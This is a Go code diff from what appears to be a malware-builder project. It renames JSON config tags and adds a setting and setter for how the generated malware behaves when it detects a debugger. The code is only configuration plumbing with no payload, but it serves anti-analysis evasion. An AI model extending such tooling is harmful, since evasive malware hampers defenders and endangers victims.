@@ -50,9 +50,12 @@ type json_t struct {
 	Bind_gut map[string]string `json:"bind_gut"`      // Contains all our bindings set by the user
 
 	// Variables
-	Var_max  int     `json:"Variable_max"`      // The max amount of allowed variables
-	Comp_var []Var_t `json:"Compile_variables"` // All the compile time variables
-	Comp_id  int     `json:"Compile_ID"`        // The current index for the compile variable
+	Var_max  int     `json:"variable_max"`      // The max amount of allowed variables
+	Comp_var []Var_t `json:"compile_variables"` // All the compile time variables
+	Comp_id  int     `json:"compile_ID"`        // The current index for the compile variable
+
+	// Debugger behavior
+	Debugger_behavior string `json:"debugger_behavior"` // How should the malware behave after detecting a debugger being used?
 }
 
 //
@@ -444,4 +447,14 @@ func (object *json_t) Check_global_name(var_name string) bool {
 	}
 
 	return to_return
+}
+
+//
+//
+// Sets the behavior tactic that the malware will undertaken
+// if it detects that it's being launched with the help of a debugger
+//
+//
+func (object *json_t) Change_detection_behavior(tactic string) {
+	object.Debugger_behavior = tactic
 }
